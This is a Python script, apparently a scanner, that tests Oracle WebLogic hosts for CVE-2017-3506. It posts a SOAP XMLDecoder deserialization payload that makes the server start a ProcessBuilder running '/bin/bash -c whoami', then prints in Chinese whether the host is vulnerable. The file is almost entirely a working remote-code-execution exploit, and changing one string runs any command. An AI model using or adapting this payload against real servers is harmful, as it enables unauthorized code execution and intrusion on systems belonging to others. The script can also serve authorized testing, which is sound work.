import re
import requests
import urllib3

urllib3.disable_warnings()

index = "CVE_2017_3506"

headers = {
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
    "Content-Type": "text/xml",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36"
}


def start(ip, port):
    req_url = f"http://{ip}:{port}/wls-wsat/CoordinatorPortType"
    post_data = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
                <void index="1">
                  <string>-c</string>
                </void>
				<void index="2">
                  <string>whoami</string>
                </void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''

    try:
        req = requests.Session()
        resp = req.post(req_url, data=post_data, verify=False, timeout=5, headers=headers)
        res = re.search(r"\<faultstring\>.*\<\/faultstring\>", resp.text).group(0)
        if '<faultstring>java.lang.ProcessBuilder' in res or "<faultstring>0" in res:
            print(f"[*] {ip}:{port} 存在Oracle WebLogic Server XMLDecoder 反序列化漏洞,CVE编号[{index}]")
        else:
            print(f"[ ] {ip}:{port} 未检测到[{index}]漏洞")
    except Exception as ex:
        pass
